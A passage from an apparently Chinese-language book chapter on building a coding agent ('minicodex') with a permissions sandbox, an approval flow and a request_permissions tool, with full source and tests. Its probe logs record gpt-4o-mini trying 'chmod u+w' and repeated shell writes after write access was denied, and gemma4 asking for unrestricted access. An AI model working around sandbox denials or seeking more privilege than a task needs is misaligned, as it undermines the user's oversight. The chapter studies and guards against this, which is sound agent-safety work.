>   写在模块顶部容易绕出循环导入。函数内 import 是一个已知的"坏味道"，这里留着，因为另一种解法（为一个读文件的函数单造一个模块）更重。
> - 最后一段（`what_to_do`）分三种情况，以及 docstring 里 `can_request` 那一段——是下面 §17.3 的故事。

### 17.3 接进 Agent

`agent.py` 的 `Agent.__init__` 多一个参数：

```python
    def __init__(
        self,
        model: Model,
        tools: dict[str, ToolFn] | None = None,
        *,
        max_turns: int = DEFAULT_MAX_TURNS,
        recorder: Recorder = NULL_RECORDER,
        dialect: Dialect = "chat_completions",
        instructions: str | None = None,
    ) -> None:
        self.model = model
        self.tools = tools or {}
        self.max_turns = max_turns
        self.recorder = recorder
        self.dialect = dialect
        # The system message, or None for the chapters 0-4 behaviour of sending
        # none at all.  Optional rather than mandatory because every test
        # written before chapter 5 asserts the exact message list, and making
        # this unconditional would have rewritten all of them to prove a point
        # about a feature they are not testing.
        self.instructions = instructions
```

`run()` 开头，在用户消息之前加上系统消息：

```python
    async def run(self, user_message: str) -> RunResult:
        history = History()
        if self.instructions is not None:
            history.add_system_note(self.instructions)
        history.add_user(user_message)
```

> 注释说了为什么是**可选**参数：第 0 到第 4 章写的每个测试都断言了完整的消息列表，改成必填就要把它们全部改一遍，
> 只为了证明一件和它们无关的事。`None` 就保持原来"不发系统消息"的行为。

### 17.4 两次，同一个 bug

**第一次，在提示词里。** 场景 B 的第一版，两边的工具列表里都**没有** `request_permissions`，而提示词最后一句无条件写着
"or call `request_permissions` with what you need and why"。原始记录里，gemma4 在 3 次里有 2 次**调用了这个不存在的工具**。

在真的 Agent 里，这会撞上第 0 章写的那条错误："no tool named 'request_permissions'"。那条消息是为**模型自己瞎编工具名**写的；
这次它没瞎编，是**提示词教它的**。修法就是 `can_request` 参数：工具不在，就不提它。

**第二次，在拒绝消息里。** 修完提示词重跑场景 A，gpt-4o-mini 的一条记录里出现了：

```
... -> run_shell(echo "def clean_body...") -> run_shell(request_permissions) -> turn limit
```

`run_shell({"command": "request_permissions"})`——**它把工具名当成 shell 命令去执行了。** 这次是拒绝消息在骗它：
`_denial` 的最后一段同样无条件写着"call request_permissions"。修法相同：`never` 策略下（没有人能批准），根本不提这个名字。

> **提到一个能力，就等于在指示模型去用它。**
> 同一个错误，同一章里犯了两次，在两个完全不同的地方。两次都是让真模型跑出来的——读代码读不出来，因为代码本身没有错。

`_POLICY_MEANING["never"]` 上面的注释说的也是这件事：`never` 下工具还在列表里，**任何一句含有这个名字的话，都可能被读成"去用它"**。

### 17.5 测：有和没有这一段，差别在哪

场景 B：同样的任务、同样的工具（两边都带 `request_permissions`），系统消息一边有权限段、一边没有。原始记录：

```
gemma4:31b-cloud
  without the block
    1: ASKED, 3 refused | ... -> request_permissions(unrestricted) -> ...
    2: ASKED, 3 refused | ... -> request_permissions(unrestricted) -> ...
    3: ASKED, 3 refused | ... -> request_permissions(unrestricted) -> ...
  with the block
    1: ASKED, 3 refused | ... -> request_permissions(write-files) -> ...
    2: ASKED, 3 refused | ... -> request_permissions(write-files) -> ...
    3: ASKED, 3 refused | ... -> request_permissions(write-files) -> ...
```

**两边都会申请。差别在申请的是什么。** 不知道自己有什么权限时，它要 `unrestricted`——菜单上最大的那个，3 次里 3 次。
知道当前是 `read-only`、知道 `workspace-write` 意味着什么之后，它要 `write-files`——**刚好够完成这个任务的那个**。

这个差别有实际代价：面对"要不要给 unrestricted"，用户只有两个选择——拒绝（任务失败），或者同意（沙箱形同虚设）。

gpt-4o-mini 上**没有复现**：两种情况下第一次都要 `write-files`（3/3）；不过拿到之后，有 2 次又追加申请了 `unrestricted`。

> **gemma4 上成立，gpt-4o-mini 上不成立。** 又是第 3 章那个陷阱：只拿强的那个模型测，每种写法看起来都没问题。

### 17.6 一个改写时才发现的缺口

改写这一章时重新对了一遍代码，发现一件原来的文字说错了的事。`__main__.py` 里拼系统消息的函数：

```python
def _instructions(session: Session) -> str:
    """The system message: what the agent is, then what it may currently do.

    Permission state goes last, and that is not a layout preference.  It is the
    only part of this string that depends on the session's state, and providers
    cache a prompt by its prefix: volatile content near the top invalidates the
    cache whenever it changes. Chapter 13 has the measurements; the ordering
    costs nothing to get right now (F13-07).

    Rendered once, when the run starts.  A later `request_permissions` reports
    the new state in its tool result, but this message keeps the old one -- a
    known gap, recorded in FAULTS.md under chapter 5.
    """
    can_request = any(tool["function"]["name"] == "request_permissions" for tool in TOOL_SCHEMAS)
    block = permissions_block(session, can_request=can_request)
    return f"{system_prompt().rstrip()}\n\n{block}"
```

`_instructions(session)` 在 `_ask` 里**只调用一次**，在对话开始时。之后 `request_permissions` 成功，改的是 `session.mode`，
**系统消息里那段权限文字不会跟着变**——它仍然写着 `read-only`。模型能从 `request_permissions` 的返回值（`Granted. Now: ...`）
知道新状态，但系统消息和工具结果从此说法不一致。

原来的 docstring 写的是"`request_permissions` 会改写它"，这不是事实。**这次没有修**：每一轮重新渲染会改变后面每一章的请求内容和快照，
是一个牵动全书的改动。改成了如实描述，并记进了 `FAULTS.md`。**缺口要说出自己的名字**——这一章第二次用到这条。

### 17.7 完整的 `__main__.py`

```python
"""Command line entry point."""

from __future__ import annotations

import argparse
import asyncio
import os
import platform
import sys
from pathlib import Path

from minicodex import __version__, system_prompt
from minicodex.agent import Agent
from minicodex.approval import AllowAll, CliApprover, Session, permissions_block
from minicodex.model import OLLAMA_BASE_URL, OPENAI_BASE_URL, ChatCompletionsModel
from minicodex.policy import APPROVAL_POLICIES, SANDBOX_MODES
from minicodex.recorder import Recorder
from minicodex.rules import DEFAULT_RULES_PATH, RuleStore
from minicodex.tools import TOOL_SCHEMAS, default_tools

PROVIDERS = {
    "ollama": (OLLAMA_BASE_URL, "gemma4:31b-cloud"),
    "openai": (OPENAI_BASE_URL, "gpt-4o-mini"),
}


def _instructions(session: Session) -> str:
    """The system message: what the agent is, then what it may currently do.

    Permission state goes last, and that is not a layout preference.  It is the
    only part of this string that depends on the session's state, and providers
    cache a prompt by its prefix: volatile content near the top invalidates the
    cache whenever it changes. Chapter 13 has the measurements; the ordering
    costs nothing to get right now (F13-07).

    Rendered once, when the run starts.  A later `request_permissions` reports
    the new state in its tool result, but this message keeps the old one -- a
    known gap, recorded in FAULTS.md under chapter 5.
    """
    can_request = any(tool["function"]["name"] == "request_permissions" for tool in TOOL_SCHEMAS)
    block = permissions_block(session, can_request=can_request)
    return f"{system_prompt().rstrip()}\n\n{block}"


async def _ask(
    question: str,
    *,
    provider: str,
    base_url: str | None,
    model: str | None,
    session: Session,
) -> int:
    default_url, default_model = PROVIDERS[provider]
    recorder = Recorder()
    llm = ChatCompletionsModel(
        base_url=base_url or default_url,
        model=model or default_model,
        # Read from the environment, never from a flag: a key in argv shows up
        # in shell history and in `ps`.
        api_key=os.environ.get("OPENAI_API_KEY") if provider == "openai" else None,
        tools=TOOL_SCHEMAS,
    )
    agent = Agent(
        llm,
        default_tools(session=session),
        recorder=recorder,
        instructions=_instructions(session),
    )

    result = await agent.run(question)

    print(result.final_text or "(no answer)")
    print(f"\n[{llm.model} | {result.stop_reason} after {result.turns_used} turn(s)]")
    print(f"[{session.describe()}]")
    print(f"[transcript: {recorder.path}]")
    return 0


def _add_permission_flags(parser: argparse.ArgumentParser) -> None:
    parser.add_argument(
        "--sandbox-mode",
        choices=SANDBOX_MODES,
        default="read-only",
        help="what the agent may do without anyone being asked (default: read-only)",
    )
    parser.add_argument(
        "--approval-policy",
        choices=APPROVAL_POLICIES,
        default="on-request",
        help="what happens to everything else (default: on-request)",
    )
    parser.add_argument(
        "--yes",
        action="store_true",
        help="approve everything without asking. For scripts you have read.",
    )


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="minicodex")
    parser.add_argument(
        "--version",
        action="store_true",
        help="print the version and enough environment detail to file a bug report",
    )
    sub = parser.add_subparsers(dest="command")

    ask = sub.add_parser("ask", help="ask a question that requires reading a file")
    ask.add_argument("question")
    ask.add_argument("--provider", choices=sorted(PROVIDERS), default="ollama")
    ask.add_argument("--base-url", default=None)
    ask.add_argument("--model", default=None)
    _add_permission_flags(ask)

    stub = sub.add_parser("serve-stub", help="replay recorded Ollama responses on a local port")
    stub.add_argument("--port", type=int, default=11435)

    sub.add_parser("rules", help="list the approvals this project has remembered")

    forget = sub.add_parser("forget", help="revoke a remembered approval by its number")
    forget.add_argument("index", type=int)

    args = parser.parse_args(argv)

    if args.version:
        print(f"minicodex {__version__}")
        print(f"python    {platform.python_version()} ({sys.platform})")
        return 0

    if args.command == "rules":
        return _list_rules()

    if args.command == "forget":
        return _forget_rule(args.index)

    if args.command == "ask":
        session = Session(
            mode=args.sandbox_mode,
            policy=args.approval_policy,
            rules=RuleStore(Path(DEFAULT_RULES_PATH)),
            approver=AllowAll() if args.yes else CliApprover(),
        )
        return asyncio.run(
            _ask(
                args.question,
                provider=args.provider,
                base_url=args.base_url,
                model=args.model,
                session=session,
            )
        )

    if args.command == "serve-stub":
        from minicodex.stub import serve

        serve(args.port)
        return 0

    parser.print_help()
    return 0


def _list_rules() -> int:
    """A rule nobody can see is a rule nobody can revoke."""
    store = RuleStore(Path(DEFAULT_RULES_PATH))
    if not len(store):
        print("no remembered approvals")
        return 0
    for index, rule in enumerate(store.all()):
        print(f"  {index}  {rule.describe()}")
    print(f"\nrevoke with: minicodex forget N   ({DEFAULT_RULES_PATH})")
    return 0


def _forget_rule(index: int) -> int:
    store = RuleStore(Path(DEFAULT_RULES_PATH))
    try:
        rule = store.forget(index)
    except IndexError:
        print(f"no rule numbered {index}; run `minicodex rules` to see them", file=sys.stderr)
        return 1
    print(f"revoked: {rule.describe()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

> - `_instructions`：检查工具表里有没有 `request_permissions`，决定 `can_request`；把 `system.md` 和权限段拼起来，权限段放**最后**。
>   docstring 解释了为什么放最后：服务商按前缀缓存提示词，会变的内容放前面，一变就让缓存失效（后面讲系统提示词的那一章会测）。
> - `_ask` 多了一个 `session` 参数，传给 `default_tools` 和 `_instructions`；结束时多打印一行当前权限。
> - **`_add_permission_flags`**：`ask` 子命令的三个新选项。`--sandbox-mode` 和 `--approval-policy` 的 `choices` 来自 `policy.py` 的元组；
>   `--yes` 用 `AllowAll` 代替终端询问，help 里写着"给你读过的脚本用"。`action="store_true"`：出现这个选项就是 `True`。
> - `main()`：新增 `rules`、`forget` 两个子命令；`ask` 时用命令行选项造出 `Session`，规则库指向 `.minicodex/rules.json`。

测试：

```python
# ---------------------------------------------------------------------------
# F05-10  the model does not know its own permissions
# ---------------------------------------------------------------------------


def test_F05_10_the_prompt_states_the_current_mode_and_policy() -> None:
    block = permissions_block(Session(mode="read-only", policy="on-request"))
    assert "read-only" in block
    assert "on-request" in block


def test_F05_10_the_prompt_is_generated_from_the_state_not_copied() -> None:
    """A permission state typed into a prompt goes stale the first time
    `request_permissions` succeeds -- and then the model is told it cannot do
    the thing it just asked for and got."""
    session = Session(mode="read-only")
    assert "read-only" in permissions_block(session)
    session.mode = "workspace-write"
    block = permissions_block(session)
    assert "workspace-write" in block
    assert "read-only" not in block


def test_F05_10_the_prompt_explains_the_denial_prefix() -> None:
    """The prompt and `permission_error` have to agree on the marker, or the
    instruction points at something the model never sees."""
    assert PERMISSION_PREFIX in permissions_block(Session())


@pytest.mark.parametrize("mode", ["read-only", "workspace-write", "full-access"])
@pytest.mark.parametrize("policy", ["never", "on-request", "unless-trusted"])
def test_F05_10_every_combination_renders(mode, policy) -> None:
    """Nine combinations, one missing dict entry away from a KeyError in the
    middle of a run."""
    assert permissions_block(Session(mode=mode, policy=policy)).strip()


def test_F05_10_the_prompt_does_not_name_a_tool_that_is_not_there() -> None:
    """Found by the probe, not by reading. With `request_permissions` removed
    from the tool list but still named in this block, gemma4 called it 2 samples
    out of 3 -- straight into chapter 0's "no tool named X" error, which was
    written for a model that made the name up. It did not make it up."""
    assert "request_permissions" not in permissions_block(Session(), can_request=False)
    assert "request_permissions" in permissions_block(Session(), can_request=True)


def test_F05_10_under_never_the_prompt_does_not_offer_an_escalation() -> None:
    """`never` means nobody is there. Telling the model to ask anyway spends a
    turn on a question that cannot be answered."""
    block = permissions_block(Session(policy="never"))
    assert "request_permissions" not in block
    assert "do not ask" in block


```

> - 权限段里有当前的模式和策略；**改了 `session.mode` 再渲染，内容跟着变**（这就是"生成，不是抄写"）；
>   权限段里提到的前缀和 `permission_error` 用的是同一个；九种组合都能渲染（两个 `parametrize` 叠在一起，得到 3×3 个用例）——
>   少写一个字典条目，就会在运行中途抛 `KeyError`；工具不在时不提它的名字；`never` 下不提申请。

---

## §18 F05-11：没路可走的时候

F05-11 说的是：**需要更多权限时没有路可走，任务卡死。**

场景 C：同一个任务，`request_permissions` 在 / 不在工具列表里。原始记录：

```
gemma4:31b-cloud
  without request_permissions
    1: did not ask, 4 refused | pytest -> ls -R -> python3 -m pytest -> /usr/bin/python3 -m pytest -> turn limit
    2: did not ask, 4 refused | pytest -> python3 -m pytest -> ls -R -> cat src/textutil.py -> turn limit
    3: did not ask, 4 refused | pytest -> python3 -m pytest -> ls -R -> python3 -m pytest -> turn limit
  with request_permissions
    1: ASKED, 1 refused | run_shell(pytest) -> request_permissions(unrestricted) -> ...
    2: ASKED, 1 refused | run_shell(ls -R) -> request_permissions(unrestricted) -> ...
    3: ASKED, 1 refused | run_shell(pytest) -> request_permissions(unrestricted) -> ...

gpt-4o-mini
  without request_permissions
    1: did not ask, 4 refused | sed -i ... -> echo "def clean_body..." -> cat ... -> head ... -> turn limit
    2: did not ask, 3 refused | git diff -> sed -i ... -> pytest -> stopped
    3: did not ask, 3 refused | pytest -> chmod u+w src/textutil.py -> echo "def clean_body..." -> turn limit
    4: did not ask, 3 refused | sed -i ... -> echo ... -> echo ... -> turn limit
  with request_permissions
    1: ASKED, 1 refused | run_shell(git checkout -b ...) -> request_permissions(write-files) -> ...
    2: ASKED, 1 refused | run_shell(git checkout -b ...) -> request_permissions(write-files) -> ...
    3: ASKED, 1 refused | run_shell(pytest) -> request_permissions(write-files) -> ...
```

**没有这个工具：7 次里 0 次申请过，全部跑到轮次上限或放弃。有这个工具：6 次里 6 次在第一次被拒后的下一轮就申请了，被拒的命令从 3～4 条降到 1 条。**

这是这一章最干净的一个结果，而且它把 §16 补完整了：

> **让模型停止重试的，不是把"重试没用"说得更清楚，而是给它一件别的事做。**
>
> 措辞（§16）：12 次里 12 次照样重试。工具（§18）：6 次里 6 次立刻改道。
>
> 第 4 章那句话在这里又对了一次：**描述能约束模型输出的形状，约束不了它对世界的预期。**
> 一个被墙挡住的模型需要的是一扇门，而不是一段关于墙的更好的说明。

### 18.1 顺带看到的两件事

**一，`chmod u+w src/textutil.py`。** 没有申请渠道时，gpt-4o-mini 试图**改文件权限**来解决问题——
它把"权限拒绝"理解成了 Unix 的文件权限。这也是"当成普通错误"的一种，而且是相当聪明的一种。

**二，拿到写权限之后，第一件事是 `sed -i` 和 `python -c 'open(...)'`。** 两个模型都是。
**模型一旦被允许改东西，就会伸手去拿解释器**——§9 那张 `INTERPRETERS` 表存在的理由，在这里被真实观察到了。

### 18.2 工具本身

`approval.py` 里：

```python
# -- asking for more -------------------------------------------------------

# What `request_permissions` may be asked for, and what granting it means.
UPGRADES: dict[str, SandboxMode] = {
    "write-files": "workspace-write",
    "unrestricted": "full-access",
}


async def request_upgrade(session: Session, *, needs: str, why: str) -> str:
    """Raise the session's permissions, if a human says so.

    This exists because of the deadlock it prevents.  Without it, an agent that
    hits a wall has two options, and both are bad: keep retrying the thing that
    is refused, or stop and report failure on a task it could have finished.
    Neither is "ask", because until now there was nothing to ask with.

    `why` is required and is shown to the user verbatim.  A request with no
    stated reason is one the user can only answer by guessing.
    """
    if needs not in UPGRADES:
        return permission_error(
            f"there is no permission called {needs!r}",
            do_this=f"Ask for one of: {', '.join(sorted(UPGRADES))}.",
        )
    if not why.strip():
        return permission_error(
            "a permission request has to say what it is for",
            do_this='Send why="I need to run the test suite, which writes to .pytest_cache".',
        )

    target = UPGRADES[needs]
    if _rank(target) <= _rank(session.mode):
        return f"Already granted: {session.describe()}. Nothing changed; go ahead."

    if session.policy == "never":
        return permission_error(
            "there is nobody to ask in this session",
            do_this=(
                "Permissions cannot change here. Finish what you can within "
                f"{session.mode}, and say plainly in your final answer what you could not do."
            ),
        )

    reply = await session.approver.ask(
        ApprovalRequest(
            what=f"raise permissions to {target}",
            reason=f"the agent says: {why.strip()}",
            risk=Risk.UNKNOWN,
            suggested_rule=None,
        )
    )
    if not reply.approved:
        return permission_error(
            "the user did not grant that",
            do_this=(
                f"Do not ask again for the same thing. Work within {session.mode}, "
                "and if the task cannot be finished that way, say so and stop."
            ),
        )

    session.mode = target
    return f"Granted. Now: {session.describe()}."


def _rank(mode: SandboxMode) -> int:
    return ("read-only", "workspace-write", "full-access").index(mode)
```

> - **`UPGRADES`**：能申请的只有两种——`write-files`（变成 `workspace-write`）和 `unrestricted`（变成 `full-access`）。
>   它同时被用作工具参数的 `enum`（下面 `tools.py` 里），所以模型只能从这两个里选。
> - **`request_upgrade` 按顺序检查**：申请的名字不存在；没写理由（`why.strip()` 去掉空白后为空）——**没有理由的申请，用户只能靠猜来回答**；
>   已经有了（`_rank` 比较两个模式的高低）——直接说"已经有了，继续"；`never` 策略下没人可问——如实说，并告诉它在最后的回答里写明做不到什么；
>   然后才问人。
> - **被拒绝时的回话要堵住重问**："Do not ask again for the same thing." 否则就是把 §16 那个重试循环原样搬到了申请权限上。
> - 同意了：改 `session.mode`，返回 `Granted. Now: ...`。**`Session` 必须可修改，原因就在这一行。**
> - `_rank(mode)`：模式在元组里的位置，0、1、2，越大权限越多。`元组.index(值)`：值在元组里的下标。

### 18.3 完整的 `tools.py`

`tools.py` 里加上 `request_permissions` 的处理函数和它的 `ToolSpec`。完整内容：

```python
"""The tools the agent may call, and the schema the model is shown.

The wording in `TOOL_SCHEMAS` is not decoration. Chapter 3 measured what
changes when it changes, and what does not:

  - Saying "relative to the repository root" fixed the path both models got
    wrong -- but only while the example in the description happened to be the
    answer. The rule is enforced in `paths.resolve()` for that reason.
  - Saying "commands are killed after 30 seconds" changed nothing at all: six
    runs out of six across both providers sent a two-minute command anyway.
    The sentence stays because it costs almost nothing and helps a human
    reading the request log, but the thing that actually redirects the model
    is the error message it gets after the kill.
  - Saying "do not use this to read a file" on `run_shell` was measured and
    made no difference here, because `read_file` and `run_shell` already say
    what they are. It is not added. Two tools whose names did NOT say what
    they were (`fetch_content` / `get_text`) did need it -- both providers
    picked the wrong one 3/3 until each description said what it was not for.
"""

from __future__ import annotations

import asyncio
import functools
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from minicodex.agent_types import ToolFn
from minicodex.approval import UPGRADES, Session, gate_command, gate_write, request_upgrade
from minicodex.patch import Edit, apply_edits
from minicodex.paths import resolve
from minicodex.shell import DEFAULT_TIMEOUT, ShellSession
from minicodex.tool_errors import tool_error


@dataclass(frozen=True)
class ToolContext:
    """Everything a handler needs that belongs to one conversation.

    `root` and `shell` already existed as loose arguments threaded through
    `functools.partial`; this only gave them a name.  `root` decides whether a
    path is inside the repository, `shell` carries the working directory across
    calls.  Neither belongs to the process, which is why neither is a
    module-level constant.

    `session` arrived in chapter 5 and is the odd one out: it is mutable, and
    it is mutable because `request_permissions` can change what the rest of the
    conversation is allowed to do.  It sits here rather than being a fourth
    argument to every handler for the same reason the other two do.
    """

    root: Path
    shell: ShellSession
    session: Session


@dataclass(frozen=True)
class ToolSpec:
    """One tool, described once.

    Before this existed there were two tables: a `{name: handler}` dict and a
    hand-written list of schemas, with nothing tying them together.  They met
    only in `__main__`, as two separate arguments, and disagreeing was silent
    in both directions -- a handler with no schema is never called, and a
    schema with no handler makes the model receive the "no tool named X" error
    that chapter 0 wrote for *hallucinated* tool names.

    `bind` rather than a ready-made handler because the two halves have
    different lifetimes.  The description and the parameters are static: the
    same for the whole process, and needed at import time to build
    `TOOL_SCHEMAS`.  The handler is per-conversation, because it closes over a
    repository root and a shell session.  Storing a bound handler here would
    drag `Path.cwd()` and a `ShellSession` into import time to satisfy a field
    that schema rendering never reads.
    """

    name: str
    description: str
    parameters: dict[str, Any]
    bind: Callable[[ToolContext], ToolFn]

    def schema(self) -> dict[str, Any]:
        """Exactly the shape both providers expect, and the only place it is built."""
        return {
            "type": "function",
            "function": {
                "name": self.name,
                "description": self.description,
                "parameters": self.parameters,
            },
        }


def _read(path: Path) -> str:
    return path.read_text(encoding="utf-8", errors="replace")


async def read_file(root: Path, args: dict[str, Any]) -> str:
    """Read a UTF-8 text file from inside the repository.

    `Path.read_text()` blocks, and a blocking call inside `async def` stops the
    whole event loop rather than just this task.  With one tool at a time nobody
    notices; once chapter 8 runs tools concurrently the concurrency quietly
    turns into a queue.  Ruff's ASYNC240 rejects the direct call, which is why
    those rules are enabled.

    `errors="replace"` for the same reason chapter 2 put it on the subprocess
    output: a file with one bad byte should come back slightly wrong, not as
    an exception that discards the whole read.
    """
    path, error = resolve(args.get("path"), root)
    if error is not None:
        return error
    assert path is not None
    return await asyncio.to_thread(_read, path)


async def run_shell(ctx: ToolContext, args: dict[str, Any]) -> str:
    """Run a shell command, if the gate lets it through.

    The only thing above the gate is the type check, and all it can do is
    return an error message.  Everything that can reach a subprocess sits below
    `gate_command`; keep it that way, because anything that runs before the gate
    is a way around it.
    """
    command = args.get("command")
    if not isinstance(command, str):
        return tool_error(
            'run_shell needs a "command" argument, a string',
            you_sent=repr(args.get("command")),
            do_this='Example: {"command": "pytest -q"}',
        )

    gated = await gate_command(command, ctx.session)
    if not gated.allowed:
        assert gated.denial is not None
        return gated.denial

    output = await ctx.shell.run(gated.command)
    # The user may have run something else entirely.  A model that is not told
    # will read this output as the result of the command it asked for and
    # report accordingly -- which is a wrong answer produced by a mechanism
    # that was working correctly.
    return f"{gated.note}\n\n{output}" if gated.note else output


async def request_permissions(ctx: ToolContext, args: dict[str, Any]) -> str:
    """Ask the user for more than the sandbox currently gives."""
    needs = args.get("needs")
    why = args.get("why")
    if not isinstance(needs, str) or not isinstance(why, str):
        return tool_error(
            'request_permissions needs "needs" and "why", both strings',
            you_sent=repr(args)[:200],
            do_this=(
                'Example: {"needs": "write-files", "why": "the test suite writes to .pytest_cache"}'
            ),
        )
    return await request_upgrade(ctx.session, needs=needs, why=why)


async def apply_patch(root: Path, session: Session, args: dict[str, Any]) -> str:
    """Replace an exact block of text in one or more files.

    The `edits` list is validated in full before anything is written --
    measured in chapter 4: writing as it goes leaves the repository
    half-edited when the third of five hunks does not match.
    """
    gated = await gate_write(f"edit files in {root.name}/", session)
    if not gated.allowed:
        assert gated.denial is not None
        return gated.denial

    raw = args.get("edits")
    if not isinstance(raw, list):
        return tool_error(
            'apply_patch needs an "edits" argument, a list of objects',
            you_sent=repr(args.get("edits")),
            do_this=(
                'Example: {"edits": [{"path": "src/a.py", '
                '"old_text": "    return 1", "new_text": "    return 2"}]}'
            ),
        )

    edits: list[Edit] = []
    for index, item in enumerate(raw, 1):
        if not isinstance(item, dict):
            return tool_error(
                f"edit {index} is not an object",
                you_sent=repr(item),
                do_this='Each edit needs "path", "old_text" and "new_text".',
            )
        missing = [k for k in ("path", "old_text", "new_text") if not isinstance(item.get(k), str)]
        if missing:
            return tool_error(
                f"edit {index} is missing {', '.join(missing)}",
                you_sent=repr(item)[:200],
                do_this='Each edit needs "path", "old_text" and "new_text", all strings.',
            )
        edits.append(Edit(item["path"], item["old_text"], item["new_text"]))

    return await asyncio.to_thread(apply_edits, edits, root)


def tool_specs(timeout: float = DEFAULT_TIMEOUT) -> list[ToolSpec]:
    """Every tool the agent has, described once.

    This list is the only place a tool is declared.  `tool_schemas()` renders
    it for the model and `default_tools()` binds it for the loop, so the two
    cannot drift: adding a tool here makes it both visible and runnable, and
    there is no longer a second place to forget.

    The timeout is still a parameter rather than a number typed into the
    string. Chapter 2 shipped `f"...killed after {30} seconds"` next to
    `DEFAULT_TIMEOUT = 30.0`, which agreed only because both were written on
    the same afternoon; nothing would have caught the day someone changed one
    of them. There is one number, and a test asserts the sentence matches it.
    """
    return [
        ToolSpec(
            name="read_file",
            description="Read a UTF-8 text file from the repository and return its contents.",
            parameters={
                "type": "object",
                "required": ["path"],
                "properties": {
                    "path": {
                        "type": "string",
                        "description": (
                            "Path to the file, relative to the repository root. "
                            "Example: src/minicodex/model.py"
                        ),
                    }
                },
            },
            bind=lambda ctx: functools.partial(read_file, ctx.root),
        ),
        ToolSpec(
            name="apply_patch",
            description=(
                "Edit files by replacing exact blocks of text. Every edit is "
                "checked before any file is written: if one fails, nothing is "
                "written."
            ),
            parameters={
                "type": "object",
                "required": ["edits"],
                "properties": {
                    "edits": {
                        "type": "array",
                        "description": "The edits to apply, in any order.",
                        "items": {
                            "type": "object",
                            "required": ["path", "old_text", "new_text"],
                            "properties": {
                                "path": {
                                    "type": "string",
                                    "description": (
                                        "Path to the file, relative to the repository "
                                        "root. Example: src/minicodex/model.py"
                                    ),
                                },
                                "old_text": {
                                    "type": "string",
                                    "description": (
                                        "The text to replace, copied from the file. It "
                                        "must appear exactly once -- include whole "
                                        "surrounding lines until it does. Do not write "
                                        "line numbers or diff markers."
                                    ),
                                },
                                "new_text": {
                                    "type": "string",
                                    "description": "What to put in its place.",
                                },
                            },
                        },
                    }
                },
            },
            bind=lambda ctx: functools.partial(apply_patch, ctx.root, ctx.session),
        ),
        ToolSpec(
            name="run_shell",
            description=(
                "Run a shell command and return its combined stdout and stderr. "
                "The working directory persists across calls within one session "
                "(cd changes it for subsequent calls). Backgrounded commands "
                "(trailing '&') are not supported. Long-running or silent "
                f"commands are killed after {timeout:.0f} seconds."
            ),
            parameters={
                "type": "object",
                "required": ["command"],
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "The shell command to run.",
                    }
                },
            },
            bind=lambda ctx: functools.partial(run_shell, ctx),
        ),
        ToolSpec(
            name="request_permissions",
            description=(
                "Ask the user to grant permissions this session does not have. Use "
                "this after a 'Permission denied:' response, when the task cannot be "
                "finished within the current permissions. Do not use it for a command "
                "that merely failed -- that is not a permissions problem."
            ),
            parameters={
                "type": "object",
                "required": ["needs", "why"],
                "properties": {
                    "needs": {
                        "type": "string",
                        "enum": sorted(UPGRADES),
                        "description": (
                            "write-files: edit files in this repository. "
                            "unrestricted: no restrictions at all."
                        ),
                    },
                    "why": {
                        "type": "string",
                        "description": (
                            "One sentence, shown to the user verbatim, saying what "
                            "you need it for. Example: the test suite writes to "
                            ".pytest_cache."
                        ),
                    },
                },
            },
            bind=lambda ctx: functools.partial(request_permissions, ctx),
        ),
    ]


def default_tools(root: Path | None = None, session: Session | None = None) -> dict[str, ToolFn]:
    """Bind every spec to one repository, one shell session and one permission set.

    A fresh `ShellSession` per call, because its state (cwd, env) belongs to
    one conversation and not to the process.  A fresh `Session` for the same
    reason -- and its default is the restrictive one, so a caller that forgets
    to pass permissions gets an agent that can read and nothing else.
    """
    context = ToolContext(
        root=(root or Path.cwd()).resolve(),
        shell=ShellSession(),
        session=session or Session(),
    )
    return {spec.name: spec.bind(context) for spec in tool_specs()}


def tool_schemas(timeout: float = DEFAULT_TIMEOUT) -> list[dict[str, Any]]:
    """What the model is shown.  Rendered from the same list, never written twice."""
    return [spec.schema() for spec in tool_specs(timeout)]


# Kept as a module-level name because `__main__` and the tests both want the
# default, and calling it once here is cheaper than threading it through.
TOOL_SCHEMAS: list[dict[str, Any]] = tool_schemas()

__all__ = [
    "TOOL_SCHEMAS",
    "ToolContext",
    "ToolSpec",
    "apply_patch",
    "default_tools",
    "read_file",
    "request_permissions",
    "run_shell",
    "tool_error",
    "tool_schemas",
    "tool_specs",
]
```

> 相对插曲 A 的改动，§12.4 讲过前四处。新增的两处：
>
> - **`request_permissions(ctx, args)`**：检查两个参数都是字符串，然后交给 `request_upgrade`。
> - **它的 `ToolSpec`**：描述里写了**什么时候用**（收到 `Permission denied:` 之后、任务在当前权限下完不成时）和**什么时候不用**
>   （命令只是失败了——那不是权限问题）。`needs` 的 `enum` 来自 `sorted(UPGRADES)`；`why` 的描述说明它会**原样展示给用户**。
> - 末尾 `__all__` 加上了 `apply_patch`、`request_permissions`、`run_shell`。

新工具改变了模型看到的工具列表，于是第 3 章和插曲 A 钉死工具描述的两个测试会红——**这正是它们存在的意义**。
这次是真的该更新快照：在 `tests/test_schemas.py` 的期望描述表里加上三条：

```python
    "request_permissions": (
        "Ask the user to grant permissions this session does not have. Use this "
        "after a 'Permission denied:' response, when the task cannot be finished "
        "within the current permissions. Do not use it for a command that merely "
        "failed -- that is not a permissions problem."
    ),
    "request_permissions.needs": (
        "write-files: edit files in this repository. unrestricted: no restrictions at all."
    ),
    "request_permissions.why": (
        "One sentence, shown to the user verbatim, saying what you need it for. "
        "Example: the test suite writes to .pytest_cache."
    ),
```

然后重新生成 `tests/fixtures/tool_schemas.json`（和插曲 A 一样，把 `TOOL_SCHEMAS` 用 `json.dumps(..., indent=2)` 写进文件），
文件末尾多出 `request_permissions` 那一整段。**两个快照一起更新，而且只因为一个原因：多了一个工具。**

### 18.4 这一节的测试，和完整的 `approval.py`

```python
# ---------------------------------------------------------------------------
# F05-11  no way to ask for more, task deadlocks
# ---------------------------------------------------------------------------


async def test_F05_11_the_agent_can_ask_for_more_and_get_it() -> None:
    session = Session(mode="read-only", approver=AllowAll())
    assert judge_write(mode=session.mode, policy=session.policy).decision is Decision.ASK

    out = await request_upgrade(session, needs="write-files", why="the task is to edit a file")
    assert "Granted" in out
    assert session.mode == "workspace-write"
    assert judge_write(mode=session.mode, policy=session.policy).decision is Decision.ALLOW


async def test_F05_11_a_refused_request_says_not_to_ask_again() -> None:
    session = Session(mode="read-only", approver=DenyAll())
    out = await request_upgrade(session, needs="write-files", why="I want to")
